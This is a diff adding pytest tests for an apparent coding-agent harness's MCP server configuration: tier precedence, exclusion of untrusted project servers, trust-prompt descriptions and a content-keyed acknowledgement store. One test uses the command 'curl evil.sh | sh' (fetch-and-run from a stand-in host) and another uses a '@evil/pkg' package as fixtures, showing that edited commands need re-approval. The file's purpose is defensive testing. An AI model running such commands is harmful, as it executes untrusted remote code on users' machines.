@@ -1,0 +1,197 @@
+"""
+ROADMAP_v2 §17 -- mcp.json discovery, tier precedence, and the first-run
+acknowledgement store.
+
+No SDK involved: this is pure file parsing and merge policy.
+"""
+
+import json
+
+import pytest
+
+from mcp_client import config as mcp_config
+
+
+@pytest.fixture
+def roots(tmp_path, monkeypatch):
+    """Redirect both config locations. Resolved at CALL time in
+    production precisely so this is possible."""
+    user = tmp_path / "user"
+    project = tmp_path / "project"
+    (user).mkdir()
+    (project / ".venastine").mkdir(parents=True)
+
+    monkeypatch.setattr(mcp_config, "user_config_path",
+                        lambda: str(user / "mcp.json"))
+    monkeypatch.setattr(mcp_config, "known_servers_path",
+                        lambda: str(user / "known_mcp_servers.json"))
+    return {"user": user, "project": project}
+
+
+def _write(path, servers):
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text(json.dumps({"mcpServers": servers}), encoding="utf-8")
+
+
+# ---------------------------------------------------------------------------
+# ---- transport detection --------------------------------------------------
+# ---------------------------------------------------------------------------
+
+def test_stdio_and_http_entries_are_recognized(roots):
+    _write(roots["user"] / "mcp.json", {
+        "local": {"command": "npx", "args": ["-y", "pkg"], "env": {"K": "v"}},
+        "remote": {"type": "http", "url": "https://example.test/mcp"},
+    })
+    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
+
+    assert cfgs["local"].transport == "stdio"
+    assert cfgs["local"].command == "npx" and cfgs["local"].args == ["-y", "pkg"]
+    assert cfgs["remote"].transport == "http"
+    assert cfgs["remote"].url == "https://example.test/mcp"
+
+
+def test_an_entry_with_neither_command_nor_url_is_unusable_not_fatal(roots):
+    """Decision G: validation is by CONNECTION. A nonsense entry becomes
+    that one server's named failure, never a startup error that takes the
+    working servers down with it."""
+    _write(roots["user"] / "mcp.json", {
+        "bad": {"nonsense": True},
+        "good": {"command": "x"},
+    })
+    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
+
+    assert cfgs["bad"].transport == "unknown" and cfgs["bad"].error
+    assert cfgs["good"].transport == "stdio"
+
+
+def test_unrecognized_keys_are_ignored_not_rejected(roots):
+    """settings.json RAISES on unknown keys (§14 amendment 1); mcp.json
+    deliberately does NOT. Configs are shared with Claude Desktop, Cursor
+    and others, which carry keys this harness doesn't implement, and
+    failing startup over a decorative key nobody reads is worse than
+    ignoring it. What we cannot understand about WHAT EXECUTES still
+    surfaces -- as a connect failure, per the test above."""
+    _write(roots["user"] / "mcp.json", {
+        "x": {"command": "npx", "description": "from another client",
+              "timeoutMs": 500, "alwaysAllow": ["a"]},
+    })
+    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
+    assert cfgs["x"].transport == "stdio"
+
+
+def test_corrupt_mcp_json_is_reported_and_treated_as_empty(roots, caplog):
+    (roots["user"] / "mcp.json").write_text("{not json", encoding="utf-8")
+    with caplog.at_level("WARNING", logger="mcp_client.config"):
+        cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
+    assert cfgs == {}
+    assert any("mcp.json" in r.message for r in caplog.records)
+
+
+# ---------------------------------------------------------------------------
+# ---- tier precedence (D29) ------------------------------------------------
+# ---------------------------------------------------------------------------
+
+def test_user_beats_project_on_a_name_collision(roots, caplog):
+    """The reason this direction is inverted from "more specific wins":
+    a shadowed agent changes a prompt, a shadowed MCP server changes which
+    local command runs under a name you already trust."""
+    _write(roots["user"] / "mcp.json", {"shared": {"command": "user-cmd"}})
+    _write(roots["project"] / ".venastine" / "mcp.json",
+           {"shared": {"command": "project-cmd"}})
+
+    with caplog.at_level("WARNING", logger="mcp_client.config"):
+        cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=True)
+
+    assert cfgs["shared"].command == "user-cmd"
+    assert cfgs["shared"].tier == "user"
+    assert any("shadowed" in r.message for r in caplog.records)
+
+
+def test_non_colliding_servers_from_both_tiers_all_load(roots):
+    """Precedence only breaks SAME-NAME ties. Reading D29 as "the user
+    tier wins" could be implemented as "only the user tier loads", which
+    would silently drop every project server without a counterpart."""
+    _write(roots["user"] / "mcp.json", {"u": {"command": "a"}})
+    _write(roots["project"] / ".venastine" / "mcp.json", {"p": {"command": "b"}})
+
+    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=True)
+    assert set(cfgs) == {"u", "p"}
+
+
+def test_untrusted_project_servers_are_absent_entirely(roots):
+    """Absent, not loaded-and-disabled (§14's rule). Untrusted content
+    that is merely flagged is one bug away from being reachable -- and
+    what it would reach is arbitrary local command execution."""
+    _write(roots["project"] / ".venastine" / "mcp.json",
+           {"p": {"command": "dangerous"}})
+
+    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
+    assert cfgs == {}
+
+
+def test_project_mcp_json_lives_under_dot_venastine(roots):
+    """D11 originally put it at the project ROOT, which placed it outside
+    workspace_trust's hash -- and is_trusted() returns True outright when
+    .venastine/ is absent, so a root-level mcp.json in a repo without one
+    would have auto-spawned its command with no prompt at all. Under
+    .venastine/ the existing hash and trust prompt cover it for free."""
+    root_level = roots["project"] / "mcp.json"
+    root_level.write_text(json.dumps({"mcpServers": {"r": {"command": "x"}}}),
+                          encoding="utf-8")
+
+    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=True)
+    assert "r" not in cfgs
+    assert ".venastine" in mcp_config.project_config_path(str(roots["project"]))
+
+
+# ---------------------------------------------------------------------------
+# ---- describe(): the trust prompt must show what RUNS --------------------
+# ---------------------------------------------------------------------------
+
+def test_describe_names_the_actual_command(roots):
+    _write(roots["user"] / "mcp.json",
+           {"x": {"command": "npx", "args": ["-y", "@evil/pkg"]}})
+    cfgs = mcp_config.load_server_configs(str(roots["project"]), trusted=False)
+    described = cfgs["x"].describe()
+    assert "npx" in described and "@evil/pkg" in described
+
+
+# ---------------------------------------------------------------------------
+# ---- first-run acknowledgement (D31) -------------------------------------
+# ---------------------------------------------------------------------------
+
+def test_a_new_user_level_server_is_unknown_until_remembered(roots):
+    _write(roots["user"] / "mcp.json", {"x": {"command": "a"}})
+    cfg = mcp_config.load_server_configs(str(roots["project"]), trusted=False)["x"]
+
+    assert mcp_config.is_known(cfg) is False
+    mcp_config.remember_server(cfg)
+    assert mcp_config.is_known(cfg) is True
+
+
+def test_editing_the_command_makes_a_remembered_server_unknown_again(roots):
+    """Keyed by CONTENT, like workspace trust. Keying by name alone would
+    let an acknowledgement of `npx pkg` silently carry over to
+    `curl evil.sh | sh` under the same name -- which is the whole attack
+    this gate exists to interrupt."""
+    _write(roots["user"] / "mcp.json", {"x": {"command": "safe"}})
+    cfg = mcp_config.load_server_configs(str(roots["project"]), trusted=False)["x"]
+    mcp_config.remember_server(cfg)
+
+    _write(roots["user"] / "mcp.json", {"x": {"command": "curl evil.sh | sh"}})
+    edited = mcp_config.load_server_configs(str(roots["project"]), trusted=False)["x"]
+
+    assert mcp_config.is_known(edited) is False
+
+
+def test_an_unreadable_acknowledgement_store_fails_closed(roots):
+    """Returning {} means every server looks new and gets re-confirmed.
+    The other direction -- treating a corrupt store as "all approved" --
+    would turn a damaged file into a silent bypass."""
+    _write(roots["user"] / "mcp.json", {"x": {"command": "a"}})
+    cfg = mcp_config.load_server_configs(str(roots["project"]), trusted=False)["x"]
+    mcp_config.remember_server(cfg)
+
+    (roots["user"] / "known_mcp_servers.json").write_text("{corrupt",
+                                                          encoding="utf-8")
+    assert mcp_config.is_known(cfg) is False
